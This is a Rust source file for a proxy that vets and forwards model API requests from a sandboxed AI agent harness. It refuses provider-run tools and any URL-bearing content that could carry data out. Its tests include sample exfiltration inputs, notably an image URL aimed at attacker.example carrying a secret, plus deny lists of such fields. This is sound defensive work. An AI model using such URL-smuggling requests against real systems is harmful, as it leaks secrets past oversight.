#![cfg_attr(not(target_os = "linux"), allow(dead_code, unused_imports))]
//! Per-run model proxy for jailed agent harnesses.
//!
//! The harness is configured with `http://127.0.0.1:PORT` as its model API
//! base URL and a random per-run token as its "API key". The proxy checks
//! the token, swaps in the real key, and forwards only the provider's model
//! endpoints, over the enclave's own TLS, to the fixed provider host. Every
//! exchange is recorded for the auditee's transcript.

use crate::llm::{Api, Routing, Target};
use crate::net::Net;
use anyhow::Result;
use attest_core::Provider;
use bytes::Bytes;
use http_body_util::{BodyExt, Full};
use hyper::{Request, Response, StatusCode};
use hyper_util::rt::TokioIo;
use serde_json::{json, Value};
use std::sync::{Arc, Mutex};
use std::time::Duration;

pub const MAX_CALLS_PER_RUN: u32 = 300;

#[derive(Default, Clone)]
pub struct Usage {
    /// Authenticated requests, counted before anything goes upstream,
    /// whether they succeed, fail or are refused.
    pub attempts: u32,
    pub calls: u32,
    pub input_tokens: u64,
    pub output_tokens: u64,
    pub models: std::collections::BTreeSet<String>,
    pub key_owner: Option<String>,
    pub upstream: std::collections::BTreeSet<String>,
}

pub struct ModelProxy {
    pub port: u16,
    pub token: String,
    pub usage: Arc<Mutex<Usage>>,
    task: tokio::task::JoinHandle<()>,
}

impl Drop for ModelProxy {
    fn drop(&mut self) {
        self.task.abort();
    }
}

struct Upstream {
    net: Net,
    target: Target,
    model: String,
    creds: crate::targets::Creds,
    routing: Routing,
    token: String,
    usage: Arc<Mutex<Usage>>,
    record: Arc<dyn Fn(Value) + Send + Sync>,
    /// One upstream request at a time.
    inflight: tokio::sync::Semaphore,
}

/// What a jailed harness may ask the provider for. Fail closed: unknown
/// fields and any tool the provider would run itself (web search/fetch,
/// remote MCP servers, code execution, file search) are refused, because
/// those make the provider contact arbitrary URLs, which could carry data
/// out. Also pins the approved model, forces `store: false`, and pads the
/// body (see `llm::pad_json`) so its size says little to the parent.
#[cfg(test)]
pub fn vet_request(
    provider: Provider,
    path: &str,
    approved_model: &str,
    body: &[u8],
) -> Result<Vec<u8>, String> {
    let t = Target::resolve(provider, approved_model, &json!({}), Some("localhost:1")).unwrap();
    vet_request_routed(&t, path, approved_model, body, &Routing::default())
}

/// `vet_request`, plus on OpenRouter the agreed routing and plugin
/// switch-offs, as the built-in harness sends them.
pub fn vet_request_routed(
    target: &Target,
    path: &str,
    approved_model: &str,
    body: &[u8],
    routing: &Routing,
) -> Result<Vec<u8>, String> {
    let provider = target.provider;
    let mut v: Value =
        serde_json::from_slice(body).map_err(|_| "request body is not JSON".to_string())?;
    let obj = v
        .as_object_mut()
        .ok_or("request body is not a JSON object")?;
    let endpoint = path.rsplit('/').next().unwrap_or("");
    let allowed: &[&str] = match endpoint {
        "messages" => &[
            "model",
            "messages",
            "system",
            "tools",
            "tool_choice",
            "max_tokens",
            "stream",
            "temperature",
            "top_p",
            "top_k",
            "thinking",
            "stop_sequences",
            "context_management",
            "output_config",
        ],
        "responses" => &[
            "model",
            "input",
            "instructions",
            "tools",
            "tool_choice",
            "parallel_tool_calls",
            "reasoning",
            "store",
            "stream",
            "include",
            "prompt_cache_key",
            "text",
            "max_output_tokens",
            "temperature",
            "top_p",
            "truncation",
            "service_tier",
        ],
        _ => &[
            "model",
            "messages",
            "tools",
            "tool_choice",
            "parallel_tool_calls",
            "stream",
            "stream_options",
            "max_tokens",
            "max_completion_tokens",
            "temperature",
            "top_p",
            "reasoning",
            "reasoning_effort",
            "response_format",
            "stop",
            "seed",
            "usage",
        ],
    };
    // Harness bookkeeping the provider doesn't need (Codex sends install and
    // session ids here): removed rather than forwarded.
    obj.remove("client_metadata");
    // Claude Code: device and session ids.
    obj.remove("metadata");
    if let Some(bad) = obj.keys().find(|k| !allowed.contains(&k.as_str())) {
        return Err(format!(
            "request field {bad:?} is not allowed through the attest proxy"
        ));
    }
    if obj.get("model").and_then(|m| m.as_str()) != Some(approved_model) {
        return Err(format!(
            "only the approved model {approved_model:?} may be used"
        ));
    }
    // The wire format decides the tool and content rules: OpenRouter
    // serves both the Anthropic and the OpenAI shapes.
    let wire = if endpoint == "messages" {
        Provider::Anthropic
    } else {
        Provider::Openai
    };
    if let Some(tools) = obj.get("tools") {
        vet_tools(wire, tools, 0)?;
    }
    // Server-side context editing may only drop old thinking or tool
    // results; output_config may only set effort or an output format.
    if let Some(cm) = obj.get("context_management") {
        let edits = cm
            .get("edits")
            .and_then(|e| e.as_array())
            .ok_or("context_management needs an edits list")?;
        if cm.as_object().map_or(true, |m| m.len() != 1) {
            return Err("context_management may only contain edits".into());
        }
        for e in edits {
            let ty = e.get("type").and_then(|t| t.as_str()).unwrap_or("");
            if !(ty.starts_with("clear_thinking_") || ty.starts_with("clear_tool_uses_")) {
                return Err(format!("context edit {ty:?} is not allowed"));
            }
        }
    }
    if let Some(oc) = obj.get("output_config").and_then(|o| o.as_object()) {
        if let Some(k) = oc
            .keys()
            .find(|k| !["effort", "format"].contains(&k.as_str()))
        {
            return Err(format!("output_config field {k:?} is not allowed"));
        }
    }
    // Content: only text, tool calls/results and reasoning. Anything that
    // points the provider at a URL or a stored file (images, documents,
    // file ids) is refused, wherever it appears.
    for key in ["input", "messages", "system", "instructions"] {
        if let Some(c) = obj.get(key) {
            vet_content(wire, c, 0)?;
        }
    }
    if endpoint == "responses" {
        obj.insert("store".into(), Value::Bool(false));
    }
    if provider == Provider::Openrouter {
        crate::llm::apply_openrouter(obj, routing);
    }
    target.adapt_body(obj);
    let out = serde_json::to_vec(&v).map_err(|e| e.to_string())?;
    Ok(crate::llm::pad_json(out))
}

const CONTENT_TYPES: &[&str] = &[
    // Responses API
    "message",
    "input_text",
    "output_text",
    "refusal",
    "function_call",
    "function_call_output",
    "custom_tool_call",
    "custom_tool_call_output",
    "local_shell_call",
    "local_shell_call_output",
    "reasoning",
    "summary_text",
    "reasoning_text",
    // Chat Completions
    "text",
    "function",
    // Anthropic Messages
    "tool_use",
    "tool_result",
    "thinking",
    "redacted_thinking",
    // Markers inside Anthropic content: cache_control, a tool call made
    // directly by the model, a reference to a tool defined in the request.
    "ephemeral",
    "direct",
    "tool_reference",
];
const URL_KEYS: &[&str] = &[
    "image_url",
    "file_url",
    "file_id",
    "file_data",
    "url",
    "server_url",
    "source",
    "input_audio",
    "image",
    "document",
    "file",
];

/// Only tools the harness runs itself, inside the jail. Responses-API
/// namespaces group such tools and are checked one level down.
fn vet_tools(provider: Provider, tools: &Value, depth: usize) -> Result<(), String> {
    let tools = tools.as_array().ok_or("tools must be an array")?;
    for t in tools {
        let ty = t.get("type").and_then(|x| x.as_str()).unwrap_or("");
        let ok = match provider {
            // Client tools have no type or "custom"; bash/text_editor
            // tools are executed by the client, inside the jail.
            Provider::Anthropic => {
                ty.is_empty()
                    || ty == "custom"
                    || ty.starts_with("bash_")
                    || ty.starts_with("text_editor_")
            }
            // Function tools run in the harness; local_shell too.
            _ => {
                ty == "function"
                    || ty == "custom"
                    || ty == "local_shell"
                    || (ty == "namespace" && depth == 0)
            }
        };
        if !ok {
            return Err(format!(
                "tool type {ty:?} is not allowed: the provider would run it outside the enclave"
            ));
        }
        if ty == "namespace" {
            vet_tools(provider, t.get("tools").unwrap_or(&Value::Null), depth + 1)?;
        }
        if let Some(k) = t
            .as_object()
            .and_then(|m| m.keys().find(|k| URL_KEYS.contains(&k.as_str())))
        {
            return Err(format!("tool field {k:?} is not allowed"));
        }
    }
    Ok(())
}

fn vet_content(provider: Provider, v: &Value, depth: usize) -> Result<(), String> {
    if depth > 32 {
        return Err("request content is nested too deeply".into());
    }
    match v {
        Value::Object(m) => {
            if let Some(k) = m.keys().find(|k| URL_KEYS.contains(&k.as_str())) {
                return Err(format!("content field {k:?} is not allowed: the provider could fetch it from outside the enclave"));
            }
            if let Some(t) = m.get("type").and_then(|t| t.as_str()) {
                // Codex sends its tool list as an input item. Its tools are
                // vetted as tools; their JSON schemas aren't content.
                if t == "additional_tools" && provider != Provider::Anthropic {
                    if let Some(k) = m
                        .keys()
                        .find(|k| !["type", "id", "role", "tools"].contains(&k.as_str()))
                    {
                        return Err(format!("additional_tools field {k:?} is not allowed"));
                    }
                    return vet_tools(provider, m.get("tools").unwrap_or(&Value::Null), 0);
                }
                if !CONTENT_TYPES.contains(&t) {
                    return Err(format!(
                        "content type {t:?} is not allowed through the attest proxy"
                    ));
                }
            }
            for val in m.values() {
                vet_content(provider, val, depth + 1)?;
            }
            Ok(())
        }
        Value::Array(a) => a
            .iter()
            .try_for_each(|x| vet_content(provider, x, depth + 1)),
        _ => Ok(()),
    }
}

/// Anthropic beta flags that only change formatting, thinking or how the
/// request's own context is handled. Others (server tools, files, MCP
/// connectors and anything new) are dropped, so they stay off.
/// Anthropic beta flags a harness may turn on, exactly as Claude Code
/// 2.1.311 sends them. Anything else is dropped (the feature stays off).
const KNOWN_BETAS: &[&str] = &[
    "interleaved-thinking-2025-05-14",
    "context-management-2025-06-27",
    "claude-code-20250219",
    "mid-conversation-tool-changes-2026-07-01",
    "thinking-token-count-2026-05-13",
    "advanced-tool-use-2025-11-20",
    "effort-2025-11-24",
];

/// The known flags among those requested, in a fixed order.
fn known_betas(v: &str) -> String {
    let asked: Vec<&str> = v.split(',').map(str::trim).collect();
    KNOWN_BETAS
        .iter()
        .filter(|b| asked.contains(b))
        .copied()
        .collect::<Vec<_>>()
        .join(",")
}

/// Total size of the headers the proxy builds, before the API key. Padded to
/// this so a harness can't vary request size through header choices (the
/// body is padded separately).
const HEADER_BYTES: usize = 1024;

/// The headers sent upstream. None are copied from the harness: they are
/// derived from the vetted request (endpoint, stream flag) and the known
/// beta flags it asked for, then padded to a fixed total size.
fn upstream_headers(messages_api: bool, version: bool, stream: bool, betas: &str) -> Vec<(String, String)> {
    let mut h = vec![
        ("content-type".to_string(), "application/json".to_string()),
        (
            "accept".to_string(),
            if stream { "text/event-stream" } else { "application/json" }.to_string(),
        ),
    ];
    if version {
        h.push(("anthropic-version".into(), "2023-06-01".into()));
    }
    if messages_api {
        if !betas.is_empty() {
            h.push(("anthropic-beta".into(), betas.to_string()));
        }
    }
    let size = |h: &Vec<(String, String)>| h.iter().map(|(k, v)| k.len() + v.len() + 4).sum::<usize>();
    let pad_name = "x-attest-pad";
    let used = size(&h) + pad_name.len() + 4;
    h.push((pad_name.into(), "0".repeat(HEADER_BYTES.saturating_sub(used).max(1))));
    h
}

impl ModelProxy {
    /// Listen on a Unix socket at `socket_path`; the jail bridges one
    /// loopback port in its own empty network namespace to it.
    pub async fn start(
        net: Net,
        target: Target,
        model: String,
        api_key: String,
        routing: Routing,
        socket_path: &str,
        record: Arc<dyn Fn(Value) + Send + Sync>,
    ) -> Result<Self> {
        let _ = std::fs::remove_file(socket_path);
        let l = tokio::net::UnixListener::bind(socket_path)?;
        let port = 0;
        let mut t = [0u8; 24];
        rand::RngCore::fill_bytes(&mut rand::rngs::OsRng, &mut t);
        let token = hex::encode(t);
        let usage = Arc::new(Mutex::new(Usage::default()));
        let up = Arc::new(Upstream {
            creds: crate::targets::Creds::new(&target, &api_key)?,
            net,
            target,
            model,
            routing,
            token: token.clone(),
            usage: usage.clone(),
            record,
            inflight: tokio::sync::Semaphore::new(1),
        });
        let task = tokio::spawn(async move {
            while let Ok((s, _)) = l.accept().await {
                let up = up.clone();
                tokio::spawn(async move {
                    let svc = hyper::service::service_fn(move |req| {
                        let up = up.clone();
                        async move { Ok::<_, std::convert::Infallible>(handle(up, req).await) }
                    });
                    let _ = hyper::server::conn::http1::Builder::new()
                        .serve_connection(TokioIo::new(s), svc)
                        .await;
                });
            }
        });
        Ok(Self {
            port,
            token,
            usage,
            task,
        })
    }
}

fn reply(status: StatusCode, msg: &str) -> Response<Full<Bytes>> {
    Response::builder()
        .status(status)
        .header("content-type", "application/json")
        .body(Full::new(Bytes::from(
            json!({"error": {"message": msg}}).to_string(),
        )))
        .unwrap()
}

async fn handle(up: Arc<Upstream>, req: Request<hyper::body::Incoming>) -> Response<Full<Bytes>> {
    let presented = req
        .headers()
        .get("authorization")
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.strip_prefix("Bearer "))
        .or_else(|| req.headers().get("x-api-key").and_then(|v| v.to_str().ok()))
        .unwrap_or("");
    if presented != up.token {
        return reply(StatusCode::UNAUTHORIZED, "wrong proxy token");
    }
    // Each request is visible to the parent as a size and a time; cap how
    // many a run can make.
    // Each request is visible to the parent as a size and a time (and a
    // refused one as a trace entry); reserve a slot before doing anything.
    let attempt = {
        let mut u = up.usage.lock().unwrap();
        u.attempts = u.attempts.saturating_add(1);
        u.attempts
    };
    if attempt > MAX_CALLS_PER_RUN {
        // Say so once; later refusals add nothing to the trace.
        if attempt == MAX_CALLS_PER_RUN + 1 {
            (up.record)(
                json!({"type": "error", "content": format!("proxy refused a model request: the run's limit of {MAX_CALLS_PER_RUN} model calls is reached")}),
            );
        }
        return reply(
            StatusCode::TOO_MANY_REQUESTS,
            "this run's model call limit is reached",
        );
    }
    if req.method() != hyper::Method::POST {
        return reply(
            StatusCode::METHOD_NOT_ALLOWED,
            "only POST to the model endpoint is forwarded",
        );
    }
    let harness_path = req.uri().path().to_string();
    let Some(api) = Api::from_path(&harness_path).filter(|a| up.target.apis().contains(a)) else {
        return reply(
            StatusCode::NOT_FOUND,
            "only the model endpoint is forwarded",
        );
    };
    let betas = req
        .headers()
        .get_all("anthropic-beta")
        .iter()
        .map(|v| String::from_utf8_lossy(v.as_bytes()).into_owned())
        .collect::<Vec<_>>()
        .join(",");
    let betas = known_betas(&betas);
    let raw = match http_body_util::Limited::new(req.into_body(), 32 << 20)
        .collect()
        .await
    {
        Ok(b) => b.to_bytes().to_vec(),
        Err(_) => return reply(StatusCode::PAYLOAD_TOO_LARGE, "request too large"),
    };
    let body = match vet_request_routed(&up.target, &harness_path, &up.model, &raw, &up.routing) {
        Ok(b) => b,
        Err(why) => {
            // Field names in `why` are request-chosen; keep the trace entry short.
            let short: String = why.chars().take(120).collect();
            (up.record)(
                json!({"type": "error", "content": format!("proxy refused a model request: {short}")}),
            );
            return reply(StatusCode::FORBIDDEN, &why);
        }
    };
    let stream = serde_json::from_slice::<Value>(&body)
        .ok()
        .and_then(|v| v.get("stream").and_then(|s| s.as_bool()))
        .unwrap_or(false);
    let Some(path) = up.target.path(api, &up.model, stream) else {
        return reply(StatusCode::NOT_FOUND, "only the model endpoint is forwarded");
    };
    let mut headers = upstream_headers(
        api == Api::Messages,
        api == Api::Messages && up.target.wants_version_header(),
        stream,
        &betas,
    );
    match up.creds.headers(&up.net, api).await {
        Ok(a) => headers.extend(a),
        Err(e) => {
            (up.record)(json!({"type": "error", "content": format!("model credentials: {e:#}")}));
            return reply(StatusCode::BAD_GATEWAY, "upstream credentials failed");
        }
    }
    let h: Vec<(&str, &str)> = headers
        .iter()
        .map(|(k, v)| (k.as_str(), v.as_str()))
        .collect();
    let host = up.target.host.clone();
    let req_summary = summarize_request(&raw);
    let _one_at_a_time = up.inflight.acquire().await;
    let resp = match up
        .net
        .request_full(
            "POST",
            up.target.mock_port.is_none(),
            &host,
            up.target.mock_port.unwrap_or(443),
            &path,
            &h,
            body,
            Duration::from_secs(600),
        )
        .await
    {
        Ok(r) => r,
        Err(e) => {
            (up.record)(
                json!({"type": "error", "content": format!("model request failed: {e:#}")}),
            );
            return reply(StatusCode::BAD_GATEWAY, "upstream request failed");
        }
    };
    let text = String::from_utf8_lossy(&resp.body).into_owned();
    if up.target.provider == Provider::Openrouter {
        if let Err(why) = crate::llm::check_reported_model(&up.model, usage_of(&text).2.as_deref())
        {
            (up.record)(json!({"type": "error", "content": why}));
            return reply(StatusCode::BAD_GATEWAY, &why);
        }
    }
    {
        let mut u = up.usage.lock().unwrap();
        u.calls += 1;
        let (i, o, m, prov) = usage_of(&text);
        u.input_tokens += i;
        u.output_tokens += o;
        if let Some(m) = m {
            u.models.insert(m);
        }
        if let Some(p) = prov {
            u.upstream.insert(p);
        }
        if u.key_owner.is_none() {
            u.key_owner = resp
                .header("openai-organization")
                .or(resp.header("anthropic-organization-id"))
                .map(String::from);
        }
    }
    (up.record)(json!({
        "type": "model_exchange",
        "status": resp.status,
        "request": req_summary,
        "response": truncate(&text, 40_000),
    }));
    let ctype = resp
        .header("content-type")
        .unwrap_or("application/json")
        .to_string();
    Response::builder()
        .status(resp.status)
        .header("content-type", ctype)
        .body(Full::new(Bytes::from(resp.body)))
        .unwrap()
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() <= max {
        return s.to_string();
    }
    let mut end = max;
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}… [{} more bytes]", &s[..end], s.len() - end)
}

/// The newest input item(s) of a request: what the harness just sent
/// (usually tool output), without repeating the whole history each time.
fn summarize_request(body: &[u8]) -> Value {
    let Ok(v) = serde_json::from_slice::<Value>(body) else {
        return json!({"bytes": body.len()});
    };
    let items = v
        .get("input")
        .or(v.get("messages"))
        .and_then(|x| x.as_array());
    let last: Vec<Value> = items
        .map(|a| a.iter().rev().take(3).rev().cloned().collect())
        .unwrap_or_default();
    let last = serde_json::to_string(&last).unwrap_or_default();
    json!({"model": v.get("model"), "items": items.map(|a| a.len()), "latest": truncate(&last, 20_000), "bytes": body.len()})
}

/// Pull usage, model and provider out of a JSON or SSE response body.
fn usage_of(text: &str) -> (u64, u64, Option<String>, Option<String>) {
    let (mut i, mut o, mut model, mut prov) = (0, 0, None, None);
    let mut take = |v: &Value| {
        let r = v.get("response").or(v.get("message")).unwrap_or(v);
        if let Some(u) = r.get("usage") {
            let gi = |k: &str| u.get(k).and_then(|x| x.as_u64()).unwrap_or(0);
            let ni = gi("input_tokens") + gi("prompt_tokens") + gi("cache_read_input_tokens");
            let no = gi("output_tokens") + gi("completion_tokens");
            // Anthropic streams usage in pieces; others report it once.
            i = i.max(ni);
            o = o.max(no);
        }
        if let Some(m) = r.get("model").and_then(|x| x.as_str()) {
            model = Some(m.to_string());
        }
        if let Some(p) = r.get("provider").and_then(|x| x.as_str()) {
            prov = Some(p.to_string());
        }
    };
    if let Ok(v) = serde_json::from_str::<Value>(text) {
        take(&v);
    } else {
        for line in text.lines() {
            if let Some(d) = line.strip_prefix("data: ") {
                if let Ok(v) = serde_json::from_str::<Value>(d) {
                    take(&v);
                }
            }
        }
    }
    (i, o, model, prov)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn or_target() -> Target {
        Target::resolve(Provider::Openrouter, "m", &json!({}), None).unwrap()
    }

    fn upstream_path(p: Provider, path: &str) -> Option<String> {
        let t = Target::resolve(p, "m", &json!({}), Some("localhost:1")).ok()?;
        t.path(Api::from_path(path)?, "m", false)
    }

    #[test]
    fn paths() {
        assert_eq!(
            upstream_path(Provider::Openai, "/v1/responses").as_deref(),
            Some("/v1/responses")
        );
        assert_eq!(
            upstream_path(Provider::Openrouter, "/v1/chat/completions").as_deref(),
            Some("/api/v1/chat/completions")
        );
        assert_eq!(
            upstream_path(Provider::Anthropic, "/v1/messages").as_deref(),
            Some("/v1/messages")
        );
        assert!(upstream_path(Provider::Openai, "/v1/files").is_none());
        assert!(upstream_path(Provider::Anthropic, "/v1/responses").is_none());
    }

    #[test]
    fn openrouter_routing() {
        let r = Routing {
            zdr: true,
            only: vec!["google-vertex".into()],
        };
        for (path, body) in [
            (
                "/api/v1/chat/completions",
                &br#"{"model":"anthropic/claude-opus-5.5","messages":[]}"#[..],
            ),
            (
                "/api/v1/responses",
                &br#"{"model":"anthropic/claude-opus-5.5","input":[]}"#[..],
            ),
            (
                "/api/v1/messages",
                &br#"{"model":"anthropic/claude-opus-5.5","messages":[]}"#[..],
            ),
        ] {
            let out = vet_request_routed(
                &or_target(),
                path,
                "anthropic/claude-opus-5.5",
                body,
                &r,
            )
            .unwrap();
            let v: Value = serde_json::from_slice(&out).unwrap();
            assert_eq!(v["provider"]["only"], json!(["google-vertex"]));
            assert_eq!(v["provider"]["allow_fallbacks"], false);
            assert_eq!(v["provider"]["zdr"], true);
            let off: Vec<&str> = v["plugins"]
                .as_array()
                .unwrap()
                .iter()
                .filter(|p| p["enabled"] == false)
                .map(|p| p["id"].as_str().unwrap())
                .collect();
            for id in ["web", "web-fetch", "fusion", "auto-router"] {
                assert!(off.contains(&id), "{id} not disabled");
            }
        }
        // Plugins are switched off even with no routing agreed.
        let out = vet_request(
            Provider::Openrouter,
            "/api/v1/chat/completions",
            "m",
            br#"{"model":"m","messages":[]}"#,
        )
        .unwrap();
        let v: Value = serde_json::from_slice(&out).unwrap();
        assert!(v.get("provider").is_none());
        assert!(v["plugins"].as_array().unwrap().len() >= 10);
        // Direct providers get neither field.
        let out = vet_request(
            Provider::Openai,
            "/v1/responses",
            "m",
            br#"{"model":"m","input":[]}"#,
        )
        .unwrap();
        let v: Value = serde_json::from_slice(&out).unwrap();
        assert!(v.get("plugins").is_none() && v.get("provider").is_none());
        // The harness can't set its own routing.
        assert!(vet_request_routed(
            &or_target(),
            "/api/v1/chat/completions",
            "m",
            br#"{"model":"m","messages":[],"provider":{"only":["x"]}}"#,
            &r
        )
        .is_err());
    }

    #[test]
    fn openrouter_models() {
        assert!(crate::llm::vet_model(Provider::Openrouter, "openrouter/fusion").is_err());
        assert!(crate::llm::vet_model(Provider::Openrouter, "openrouter/fusion-flash").is_err());
        assert!(crate::llm::vet_model(Provider::Openrouter, "openrouter/auto").is_err());
        assert!(crate::llm::vet_model(Provider::Openrouter, "switchpoint/router").is_err());
        assert!(crate::llm::vet_model(Provider::Openrouter, "anthropic/claude-opus-5.5").is_ok());
        assert!(crate::llm::check_reported_model("a/b", Some("a/b")).is_ok());
        assert!(crate::llm::check_reported_model("a/b", None).is_ok());
        assert!(crate::llm::check_reported_model("a/b", Some("typesafe/jev")).is_err());
        assert!(
            crate::llm::vet_routing(Provider::Openrouter, &["google-vertex/us".into()]).is_ok()
        );
        assert!(crate::llm::vet_routing(Provider::Openrouter, &["Google Vertex".into()]).is_err());
        assert!(crate::llm::vet_routing(Provider::Openai, &["azure".into()]).is_err());
    }

    #[test]
    fn vetting() {
        let ok = br#"{"model":"m","input":[],"tools":[{"type":"function","name":"shell"}],"stream":true}"#;
        let out = vet_request(Provider::Openai, "/v1/responses", "m", ok).unwrap();
        assert_eq!(out.len() % (16 << 10), 0);
        let v: Value = serde_json::from_slice(&out).unwrap();
        assert_eq!(v["store"], false);
        // Provider-run tools, MCP servers, other models and unknown fields are refused.
        for bad in [
            &br#"{"model":"m","input":[],"tools":[{"type":"web_search"}]}"#[..],
            br#"{"model":"m","input":[],"tools":[{"type":"mcp","server_url":"https://x"}]}"#,
            br#"{"model":"other","input":[]}"#,
            br#"{"model":"m","input":[],"background":true}"#,
            br#"{"model":"m","input":[],"previous_response_id":"r"}"#,
            br#"{"model":"m","input":[{"role":"user","content":[{"type":"input_image","image_url":"https://attacker.example/p.png?d=secret"}]}]}"#,
            br#"{"model":"m","input":[{"role":"user","content":[{"type":"input_file","file_url":"https://x"}]}]}"#,
            br#"{"model":"m","input":[{"type":"function_call_output","call_id":"c","output":[{"type":"input_image","image_url":"https://x"}]}]}"#,
        ] {
            assert!(vet_request(Provider::Openai, "/v1/responses", "m", bad).is_err(), "{}", String::from_utf8_lossy(bad));
        }
        assert!(vet_request(
            Provider::Openrouter,
            "/api/v1/chat/completions",
            "m",
            br#"{"model":"m","messages":[],"plugins":[{"id":"web"}]}"#
        )
        .is_err());
        assert!(vet_request(
            Provider::Anthropic,
            "/v1/messages",
            "m",
            br#"{"model":"m","messages":[],"mcp_servers":[]}"#
        )
        .is_err());
        assert!(vet_request(Provider::Anthropic, "/v1/messages", "m", br#"{"model":"m","messages":[],"tools":[{"type":"web_fetch_20250910","name":"web_fetch"}]}"#).is_err());
        // Claude Code: Messages API through OpenRouter, with context editing,
        // cache markers and its metadata (dropped).
        let cc = |extra: &str| {
            format!(
                r#"{{"model":"m","max_tokens":10,"metadata":{{"user_id":"d"}},"output_config":{{"effort":"low"}},"thinking":{{"type":"adaptive"}},"system":[{{"type":"text","text":"s","cache_control":{{"type":"ephemeral"}}}}],"messages":[{{"role":"assistant","content":[{{"type":"tool_use","id":"t","name":"Bash","input":{{}},"caller":{{"type":"direct"}}}}]}}],"tools":[{{"name":"Bash","input_schema":{{"type":"object"}}}}]{extra}}}"#
            )
        };
        let out = vet_request(Provider::Openrouter, "/v1/messages", "m", cc(r#","context_management":{"edits":[{"type":"clear_thinking_20251015","keep":"all"}]}"#).as_bytes()).unwrap();
        assert!(!String::from_utf8_lossy(&out).contains("user_id"));
        assert!(vet_request(
            Provider::Openrouter,
            "/v1/messages",
            "m",
            cc(r#","context_management":{"edits":[{"type":"compact_20260101"}]}"#).as_bytes()
        )
        .is_err());
        assert!(vet_request(
            Provider::Openrouter,
            "/v1/messages",
            "m",
            cc(r#","mcp_servers":[{"type":"url","url":"https://x"}]"#).as_bytes()
        )
        .is_err());
        assert!(vet_request(
            Provider::Openrouter,
            "/v1/messages",
            "m",
            cc(r#","output_config":{"effort":"low","tools":[]}"#).as_bytes()
        )
        .is_err());
        assert_eq!(
            upstream_path(Provider::Openrouter, "/v1/messages").as_deref(),
            Some("/api/v1/messages")
        );
        assert!(upstream_path(Provider::Openai, "/v1/messages").is_none());
        assert_eq!(known_betas("effort-2025-11-24, mcp-client-2025-04-04,files-api-2025-04-14,interleaved-thinking-2025-05-14"), "interleaved-thinking-2025-05-14,effort-2025-11-24");
        assert_eq!(known_betas("effort-2025-11-24-and-more-text"), "");
        // Every header combination comes out the same size.
        let size = |h: Vec<(String, String)>| h.iter().map(|(k, v)| k.len() + v.len() + 4).sum::<usize>();
        let all = KNOWN_BETAS.join(",");
        let sizes = [
            size(upstream_headers(false, false, false, "")),
            size(upstream_headers(false, false, true, "")),
            size(upstream_headers(true, true, true, "")),
            size(upstream_headers(true, true, false, &all)),
            size(upstream_headers(true, false, true, "effort-2025-11-24")),
        ];
        assert!(sizes.iter().all(|s| *s == HEADER_BYTES), "{sizes:?}");
        // Codex 0.164 sends tools as an input item, grouped in namespaces.
        let at = |tool: &str| {
            format!(
                r#"{{"model":"m","input":[{{"type":"additional_tools","id":"a","role":"developer","tools":[{{"type":"namespace","name":"functions","description":"d","tools":[{tool}]}}]}},{{"type":"message","role":"user","content":[{{"type":"input_text","text":"hi"}}]}}],"client_metadata":{{"session_id":"s"}}}}"#
            )
        };
        let ok = at(
            r#"{"type":"function","name":"wait","parameters":{"type":"object","properties":{"ms":{"type":"number"}}}},{"type":"custom","name":"exec","format":{"type":"grammar","syntax":"lark","definition":"start: /.+/"}}"#,
        );
        let out = vet_request(Provider::Openai, "/v1/responses", "m", ok.as_bytes()).unwrap();
        assert!(!String::from_utf8_lossy(&out).contains("client_metadata"));
        assert!(vet_request(
            Provider::Openai,
            "/v1/responses",
            "m",
            at(r#"{"type":"web_search"}"#).as_bytes()
        )
        .is_err());
        assert!(vet_request(
            Provider::Openai,
            "/v1/responses",
            "m",
            at(r#"{"type":"namespace","name":"n","tools":[{"type":"function","name":"f"}]}"#)
                .as_bytes()
        )
        .is_err());
        assert!(vet_request(
            Provider::Openai,
            "/v1/responses",
            "m",
            at(r#"{"type":"mcp","server_url":"https://x"}"#).as_bytes()
        )
        .is_err());
        assert!(vet_request(
            Provider::Anthropic,
            "/v1/messages",
            "m",
            br#"{"model":"m","messages":[],"tools":[{"name":"read","input_schema":{}}]}"#
        )
        .is_ok());
        assert!(vet_request(Provider::Anthropic, "/v1/messages", "m", br#"{"model":"m","messages":[{"role":"user","content":[{"type":"image","source":{"type":"url","url":"https://x"}}]}]}"#).is_err());
        assert!(vet_request(Provider::Openrouter, "/api/v1/chat/completions", "m", br#"{"model":"m","messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":"https://x"}}]}]}"#).is_err());
        // Ordinary Codex-shaped traffic passes.
        assert!(vet_request(Provider::Openai, "/v1/responses", "m", br#"{"model":"m","instructions":"i","input":[{"type":"message","role":"user","content":[{"type":"input_text","text":"hi"}]},{"type":"function_call","name":"shell","arguments":"{}","call_id":"c"},{"type":"function_call_output","call_id":"c","output":"ok"},{"type":"reasoning","summary":[{"type":"summary_text","text":"t"}],"encrypted_content":"x"}],"tools":[{"type":"function","name":"shell","parameters":{"type":"object"}}],"stream":true,"include":["reasoning.encrypted_content"]}"#).is_ok());
    }

    #[test]
    fn usage_from_sse() {
        let sse = "event: response.completed\ndata: {\"type\":\"response.completed\",\"response\":{\"model\":\"gpt-x\",\"usage\":{\"input_tokens\":10,\"output_tokens\":3}}}\n\n";
        assert_eq!(usage_of(sse), (10, 3, Some("gpt-x".into()), None));
    }
}
